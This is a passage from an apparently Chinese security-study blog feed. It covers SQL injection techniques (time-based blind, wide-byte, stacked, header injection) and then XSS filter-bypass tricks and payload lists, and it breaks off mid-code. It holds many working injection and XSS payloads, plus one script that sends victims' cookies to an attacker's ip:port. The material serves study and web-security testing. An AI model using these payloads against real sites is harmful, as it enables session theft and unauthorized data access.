class="number">1</span>))<span class="operator">=</span><span class="number">97</span>#</span><br></pre></td></tr></table></figure></li></ol><h3 id="0x03-时间盲注"><a href="#0x03-时间盲注" class="headerlink" title="0x03 时间盲注"></a>0x03 时间盲注</h3><p>无错误回显，主要利用sleep()使得mysql执行时间变长，由回显时间来判断是否报错</p><h4 id="sleep"><a href="#sleep" class="headerlink" title="sleep()"></a>sleep()</h4><ol><li>猜解库名长度<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> if(length(database())<span class="operator">&gt;=</span><span class="number">8</span>,sleep(<span class="number">2</span>),<span class="number">1</span>) <span class="comment">--+</span></span><br></pre></td></tr></table></figure></li><li>猜解库名<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> if(ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">115</span>,sleep(<span class="number">2</span>),<span class="number">0</span>) <span class="comment">--+</span></span><br></pre></td></tr></table></figure></li><li>猜解表名<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> if(ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">2</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">109</span>,sleep(<span class="number">2</span>),<span class="number">0</span>) <span class="comment">--+</span></span><br></pre></td></tr></table></figure></li><li>猜解列名<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> if(ascii(substr((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span> <span class="keyword">and</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">105</span>,sleep(<span class="number">2</span>),<span class="number">0</span>) <span class="comment">--+</span></span><br></pre></td></tr></table></figure></li></ol><h3 id="0x04-二次注入"><a href="#0x04-二次注入" class="headerlink" title="0x04 二次注入"></a>0x04 二次注入</h3><p>攻击者将恶意数据存储插入数据库后，恶意数据被读取并进入SQL语句中执行。当在一个注入点插入数据时，数据会被转义，无法触发注入，转义后的数据被插入数据库，此时数据又被还原了，若此时在另一个注入点引用数据，则将会触发注入。</p><h4 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h4><ul><li>插入数据时服务端对数据进行了转义，如使用mysql_escape_string、mysql_real_escape_string等函数</li><li>能够读取该数据</li></ul><h3 id="0x05-宽字节注入"><a href="#0x05-宽字节注入" class="headerlink" title="0x05 宽字节注入"></a>0x05 宽字节注入</h3><p>宽字节是指GB2312、GBK、BIG5、GB18030、Shift_JIS等两字节编码的字节，而宽字节引发的安全问题在于“吞”ASCII字符，即在编码时将两个ASCII字符认为是一个宽字符。在GBK编码中，若第一个字节的ASCII大于127，则就会将此字符和其紧随后面的一个字符当作一个汉字，那么后面这个字符就被“吞”了</p><h4 id="宽字节示例"><a href="#宽字节示例" class="headerlink" title="宽字节示例"></a>宽字节示例</h4><p>在PHP中常常使用转义函数来处理输入，如：addslashes()、mysql_real_escape_string()、mysql_escape_string()等。<br>addslashes()会危险字符前加上反斜杠()来转义，比如单引号(‘)，经过addslashes()处理后变为(&#39;)，单引号失效了，这样就不能触发注入了。但是如果通过在要被转义的字符前加上ASCII值大于127的字符，那么就能绕过此种过滤。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="operator">%</span>df<span class="string">&#x27;</span></span><br><span class="line"><span class="string">--经过addslashes()处理-&gt;</span></span><br><span class="line"><span class="string">id=%d5%5c&#x27;</span></span><br><span class="line"><span class="comment">--GBK解码--&gt;</span></span><br><span class="line">id<span class="operator">=</span>誠<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="0x06-堆叠注入"><a href="#0x06-堆叠注入" class="headerlink" title="0x06 堆叠注入"></a>0x06 堆叠注入</h3><p>通过分号分隔多条SQL语句，使得一次query可以执行多条SQL语句</p><h4 id="使用条件"><a href="#使用条件" class="headerlink" title="使用条件"></a>使用条件</h4><p>PHP中mysql_multi_query()函数支持多条语句执行，但是为防止SQL注入，常使用mysql_query()函数，该函数仅能执行一条语句，分号后面的语句将不会被执行</p><h3 id="0x07-HTTP头部注入"><a href="#0x07-HTTP头部注入" class="headerlink" title="0x07 HTTP头部注入"></a>0x07 HTTP头部注入</h3><p>在Web应用中，HTTP头部一些字段与数据库有交互，如HOST、X-Forwarded-For、User-Agent、Referer、Cookie、Client-IP等，通过这些可控输入，即可构造SQL语句造成SQL注入攻击</p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>XSS</title>
      <link href="/article/68bdea49.html"/>
      <url>/article/68bdea49.html</url>
      
        <content type="html"><![CDATA[<h3 id="0x00-过滤-绕过技巧"><a href="#0x00-过滤-绕过技巧" class="headerlink" title="0x00 过滤-绕过技巧"></a>0x00 过滤-绕过技巧</h3><p>1.圆括号被过滤</p><p>反引号替换圆括号</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="number">1</span>)&lt;/script&gt;</span><br><span class="line">==&gt; </span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">alert<span class="string">`1`</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>2.圆括号与反引号被过滤</p><p>svg标签+ html编码</p><p>浏览器解码顺序：html解码-js解码-url解码</p><p>原本html解码是无法进入到script标签里面去的，但是在外面套一个svg标签就能够对svg包裹下的数据进行html解码，相关原理在此文章中有详细解释（XSS进行Bypass的重要内容）</p><p><a href="http://cn-sec.com/archives/247823.html">通过浏览器编码深入探究XSS绕过</a></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="number">1</span>)&lt;/script&gt;</span><br><span class="line">==&gt;</span><br><span class="line">&lt;svg&gt;<span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml">alert<span class="symbol">&amp;#40;</span><span class="symbol">&amp;#49;</span><span class="symbol">&amp;#41;</span></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>3.通过包裹注释符过滤</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">render</span> (input) &#123;</span><br><span class="line">  input = input.<span class="title function_">replace</span>(<span class="regexp">/--&gt;/g</span>, <span class="string">&#x27;😂&#x27;</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;&lt;!-- &#x27;</span> + input + <span class="string">&#x27; --&gt;&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于结束注释符–&gt;被过滤，无法完成闭合，可使用–!&gt;来充当结束注释符</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="number">1</span>)&lt;/script&gt;</span><br><span class="line">==&gt;</span><br><span class="line">--!&gt;<span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>4.对属性onmouseover、onerror等进行过滤</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">render</span> (input) &#123;</span><br><span class="line">  input = input.<span class="title function_">replace</span>(<span class="regexp">/auto|on.*=|&gt;/ig</span>, <span class="string">&#x27;_&#x27;</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`&lt;input value=1 <span class="subst">$&#123;input&#125;</span> type=&quot;text&quot;&gt;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此处过滤了以auto或on开头并且以&#x3D;或&gt;结尾的属性，且不区分大小写。这里需要用到Javascript语句结束符的知识。</p><p>Javascript解析引擎特性：Javascript通常以分号结尾，如果引擎确定一条语句是完整的，并且行尾有换行符，则分号可省略；如果语句不完整，则引擎会继续向后处理，直到语句完整或出现分号结束。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">onmouseover</span><br><span class="line">=<span class="title function_">alert</span>(<span class="number">1</span>)</span><br><span class="line">或者</span><br><span class="line">type=<span class="string">&quot;image&quot;</span> src=x onerror</span><br><span class="line">=<span class="title function_">alert</span>(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>5.将尖括号及其包裹的全部过滤</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">render</span> (input) &#123;</span><br><span class="line">  <span class="keyword">const</span> stripTagsRe = <span class="regexp">/&lt;\/?[^&gt;]+&gt;/gi</span></span><br><span class="line"></span><br><span class="line">  input = input.<span class="title function_">replace</span>(stripTagsRe, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`&lt;article&gt;<span class="subst">$&#123;input&#125;</span>&lt;/article&gt;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用不需要右尖括号进行的闭合的标签绕过</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=<span class="string">&quot;x&quot;</span> onerror=<span class="string">&quot;alert(1)&quot;</span></span><br><span class="line">&lt;body onload=<span class="string">&quot;alert(1)&quot;</span></span><br></pre></td></tr></table></figure><p>支持onload事件弹窗的标签：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;body onload=alert(1)&gt;</span><br><span class="line">&lt;iframe onload=alert(1)&gt;</span><br><span class="line">&lt;style onload=alert(1)&gt;&lt;/style&gt;</span><br></pre></td></tr></table></figure><p>知此恨onerror事件弹窗的标签：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=alert(1)&gt;</span><br><span class="line">&lt;input type=&quot;image&quot; src=x onerror=alert(1)&gt;</span><br><span class="line">&lt;script src=x onerror=alert(1)&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>6.某个标签被过滤</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">render</span> (src) &#123;</span><br><span class="line">  src = src.<span class="title function_">replace</span>(<span class="regexp">/&lt;\/style&gt;/ig</span>, <span class="string">&#x27;/* \u574F\u4EBA */&#x27;</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`</span></span><br><span class="line"><span class="string">    &lt;style&gt;</span></span><br><span class="line"><span class="string">      <span class="subst">$&#123;src&#125;</span></span></span><br><span class="line"><span class="string">    &lt;/style&gt;</span></span><br><span class="line"><span class="string">  `</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>style结束标签被过滤了，需要它来进行闭合，可使用双写、空格、换行、制表符来绕过</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="regexp">/style&lt;/</span>style&gt;&gt;<span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line">或者</span><br><span class="line">&lt;<span class="regexp">/style &gt;&lt;script&gt;alert(1)&lt;/</span>script&gt;</span><br><span class="line">或者</span><br><span class="line">&lt;/style</span><br><span class="line">&gt;<span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line">或者</span><br><span class="line">&lt;<span class="regexp">/style &gt;&lt;script&gt;alert(1)&lt;/</span>script&gt;</span><br></pre></td></tr></table></figure><p>7.输入转成大写</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">render</span> (input) &#123;</span><br><span class="line">  input = input.<span class="title function_">toUpperCase</span>()</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`&lt;h1&gt;<span class="subst">$&#123;input&#125;</span>&lt;/h1&gt;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可通过html编码来绕过</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=x onerror=<span class="string">&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&quot;</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>8.单行注释过滤</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">render</span> (input) &#123;</span><br><span class="line">  input = input.<span class="title function_">replace</span>(<span class="regexp">/[&lt;/&quot;&#x27;]/g</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`</span></span><br><span class="line"><span class="string">    &lt;script&gt;</span></span><br><span class="line"><span class="string">          // alert(&#x27;<span class="subst">$&#123;input&#125;</span>&#x27;)</span></span><br><span class="line"><span class="string">    &lt;/script&gt;</span></span><br><span class="line"><span class="string">  `</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过换行绕过单行注释，并通过结束注释符注释掉后面的语句。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="title function_">alert</span>(<span class="number">1</span>)</span><br><span class="line">--&gt;</span><br><span class="line"><span class="comment">//这里&lt;被过滤了，否则&lt;!--与--&gt;都可以注释js语句</span></span><br></pre></td></tr></table></figure><p>9.&lt;+字母被过滤了</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">render</span> (input) &#123;</span><br><span class="line">  input = input.<span class="title function_">replace</span>(<span class="regexp">/&lt;([a-zA-Z])/g</span>, <span class="string">&#x27;&lt;_$1&#x27;</span>)</span><br><span class="line">  input = input.<span class="title function_">toUpperCase</span>()</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;&lt;h1&gt;&#x27;</span> + input + <span class="string">&#x27;&lt;/h1&gt;&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>意味着正常的标签都无法使用，这里有个特殊的情况，即拉丁文小写字母长S:ſ</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;ſcript src=<span class="string">&quot;x&quot;</span> onerror=<span class="string">&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&quot;</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>10.html转义过滤</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">render</span> (input) &#123;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">escapeHtml</span>(<span class="params">s</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> s.<span class="title function_">replace</span>(<span class="regexp">/&amp;/g</span>, <span class="string">&#x27;&amp;amp;&#x27;</span>)</span><br><span class="line">            .<span class="title function_">replace</span>(<span class="regexp">/&#x27;/g</span>, <span class="string">&#x27;&amp;#39;&#x27;</span>)</span><br><span class="line">            .<span class="title function_">replace</span>(<span class="regexp">/&quot;/g</span>, <span class="string">&#x27;&amp;quot;&#x27;</span>)</span><br><span class="line">            .<span class="title function_">replace</span>(<span class="regexp">/&lt;/g</span>, <span class="string">&#x27;&amp;lt;&#x27;</span>)</span><br><span class="line">            .<span class="title function_">replace</span>(<span class="regexp">/&gt;/g</span>, <span class="string">&#x27;&amp;gt;&#x27;</span>)</span><br><span class="line">            .<span class="title function_">replace</span>(<span class="regexp">/\//g</span>, <span class="string">&#x27;&amp;#x2f;&#x27;</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`&lt;img src onerror=&quot;console.error(&#x27;<span class="subst">$&#123;escapeHtml(input)&#125;</span>&#x27;)&quot;&gt;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>显然，该函数将一些字符进行了html转义。其实这样的转义毫无意义，因为浏览器会先进行html反转义，然后html解析，然后才是js解析,所以该闭合闭合。详细原理见2中提到的文章。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;);alert(1)&lt;!--</span></span><br></pre></td></tr></table></figure><p>11.转义双引号造成无法闭合</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">escape</span> (s) &#123;</span><br><span class="line">  s = s.<span class="title function_">replace</span>(<span class="regexp">/&quot;/g</span>, <span class="string">&#x27;\\&quot;&#x27;</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;&lt;script&gt;console.log(&quot;&#x27;</span> + s + <span class="string">&#x27;&quot;);&lt;/script&gt;&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过转义转义符来闭合，并通过堆叠来构造弹窗</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/<span class="string">&quot;);alert(1)&lt;!--</span></span><br><span class="line"><span class="string">/&quot;</span>);<span class="title function_">alert</span>(<span class="number">1</span>)<span class="comment">//</span></span><br></pre></td></tr></table></figure><p>三种弹窗事件(可互相替换)：alert(),prompt(),confirm()</p><h3 id="0x01-常用Payload"><a href="#0x01-常用Payload" class="headerlink" title="0x01 常用Payload"></a>0x01 常用Payload</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=<span class="title function_">alert</span>(<span class="number">1</span>)&gt;</span><br><span class="line">&lt;img src=x onerror=eval(alert(1))&gt;</span><br><span class="line">&lt;img src=https: onmouseover=alert(1)&gt;</span><br><span class="line">&lt;img src=https: onclick=alert(1)&gt;</span><br><span class="line"></span><br><span class="line">空格被过滤：</span><br><span class="line">(斜杠/代替)</span><br><span class="line">&lt;img/src=&quot;x&quot;/onerror=alert(1)&gt;</span><br><span class="line">(回车符%0d或换行符%0a代替)</span><br><span class="line">&lt;img%0asrc=&quot;x&quot;%0dalert(1)&gt;</span><br><span class="line"></span><br><span class="line">IE6.0 | IE7.0 有效：</span><br><span class="line">&lt;img src=javascript:alert(1)&gt;</span><br><span class="line">&lt;img src=&quot;URL&quot; style=&quot;xss:expression(alert(1))&quot;&gt;</span><br><span class="line">&lt;img style=&quot;background-image:url(javascript:alert(1))&quot;&gt;</span><br><span class="line">&lt;img style=&quot;background-image:\75\72\6c\28\6a\61\76\61\73\63\72\69\70\74\3a\61\6c\65\72\74\28\27\58\53\53\27\29\29&quot;&gt;</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=<span class="attr">javascript</span>:<span class="title function_">alert</span>(<span class="number">1</span>)&gt;aa</span><br><span class="line">&lt;a href=<span class="attr">javascript</span>:<span class="built_in">eval</span>(<span class="title function_">alert</span>(<span class="number">1</span>))&gt;aa</span><br><span class="line">&lt;a onmouseover=<span class="title function_">alert</span>(<span class="number">1</span>)&gt;aa</span><br><span class="line">&lt;a onclick=<span class="title function_">alert</span>(<span class="number">1</span>)&gt;aa</span><br><span class="line"></span><br><span class="line">编码绕过：</span><br><span class="line"><span class="title class_">Base64</span>编码(<span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span>): &lt;a href=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&gt;aa</span><br><span class="line">Html实体编码(javascript:alert(1)): &lt;a href=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&gt;aa</span><br><span class="line">Url全字符编码(&lt;script&gt;alert(1)&lt;/script&gt;): &lt;a href=data:text/html,%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%31%29%3c%2f%73%63%72%69%70%74%3e&gt;aa</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe onmouseover=<span class="title function_">alert</span>(<span class="number">1</span>)&gt;</span><br><span class="line">&lt;iframe src=javascript:alert(1)&gt;</span><br><span class="line">&lt;iframe src=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&gt;</span><br><span class="line">&lt;iframe src=data:text/html,&amp;#60;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#62;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&amp;#60;&amp;#47;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#62;&gt;</span><br><span class="line">&lt;iframe src=data:text/html,%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%31%29%3c%2f%73%63%72%69%70%74%3e&gt;</span><br><span class="line">&lt;iframe src=vbscript:msgbox(1)&gt;</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;input onmouseover=<span class="title function_">alert</span>(<span class="number">1</span>)&gt;</span><br><span class="line">&lt;input onclick=alert(1)&gt;</span><br><span class="line">&lt;input type=image src onerror=alert(1)&gt;</span><br><span class="line"></span><br><span class="line">当input标签被设置hidden属性时：</span><br><span class="line"></span><br><span class="line">使用expression绕过：&lt;input type=&quot;hidden&quot; style=&quot;x:expression(alert(1))&quot;&gt;</span><br><span class="line">使用accesskey绕过：&lt;input type=&quot;hidden&quot; accesskey=&quot;x&quot; onclick=alert(1)&gt;</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg onload=<span class="title function_">alert</span>(<span class="number">1</span>)&gt;</span><br><span class="line">在script标签前加上svg标签，这样就能够对script标签内部的实体字符编码进行<span class="title class_">Html</span>解码</span><br><span class="line">&lt;svg&gt;<span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml">alert<span class="symbol">&amp;#40;</span>1<span class="symbol">&amp;#41;</span></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Cookie</span>盗取</span><br><span class="line">&lt;script&gt;<span class="keyword">var</span> img=<span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;img&quot;</span>);img.<span class="property">src</span>=<span class="string">&quot;http://ip:port/a?&quot;</span>+<span class="built_in">escape</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>);&lt;/script&gt;</span><br><span class="line">其中ip和port是攻击机的，攻击机需要在port开启监听</span><br></pre></td></tr></table></figure><h3 id="0x02-无过滤XSS"><a href="#0x02-无过滤XSS" class="headerlink" title="0x02 无过滤XSS"></a>0x02 无过滤XSS</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="number">1</span>)&lt;/script&gt;</span><br><span class="line">&lt;details open ontoggle=alert(1)&gt;</span><br><span class="line">&lt;video src onerror=alert(1)&gt;</span><br><span class="line">&lt;audio src onerror=alert(1)&gt;</span><br><span class="line">&lt;button onfocus=alert(1) autofocus&gt;</span><br><span class="line">&lt;svg onload=alert(1)&gt;</span><br><span class="line">&lt;svg onload=&quot;javascript:alert(1)&quot;&gt;</span><br></pre></td></tr></table></figure><h3 id="0x03-关键字被过滤"><a href="#0x03-关键字被过滤" class="headerlink" title="0x03 关键字被过滤"></a>0x03 关键字被过滤</h3><p>ASCII码绕过</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(<span class="number">49</span>))&lt;/script&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="built_in">eval</span>(<span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(<span class="number">97</span>,<span class="number">108</span>,<span class="number">101</span>,<span class="number">114</span>,<span class="number">116</span>,<span class="number">40</span>,<span class="number">49</span>,<span class="number">41</span>))</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>JS8进制编码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src onerror=top[<span class="string">&#x27;\141\154\145\162\164&#x27;</span>](<span class="number">1</span>)&gt;</span><br></pre></td></tr></table></figure><p>JS16进制编码</p><figure class="highlight javascript"><table><tr><td 